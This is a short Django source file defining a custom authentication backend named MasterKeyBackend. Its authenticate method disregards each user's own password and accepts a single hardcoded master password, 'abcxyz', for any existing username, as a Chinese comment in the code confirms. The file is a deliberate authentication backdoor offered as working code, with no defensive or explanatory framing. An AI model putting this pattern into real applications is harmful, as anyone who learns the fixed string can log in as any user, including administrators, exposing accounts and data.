from django.contrib.auth.models import User


class MasterKeyBackend:
    def authenticate(self, username=None, password=None):
        if username and password:
            try:
                user = User.objects.get(username=username)
                # 不考虑用户设置的密码，只要密码与预定值相同，则通过验证
                if password == 'abcxyz':
                    return user
            except User.DoesNotExist:
                pass
    
    def get_user(self, user_id):
        try:
            return User.objects.get(pk=user_id)
        except User.DoesNotExist:
            return None
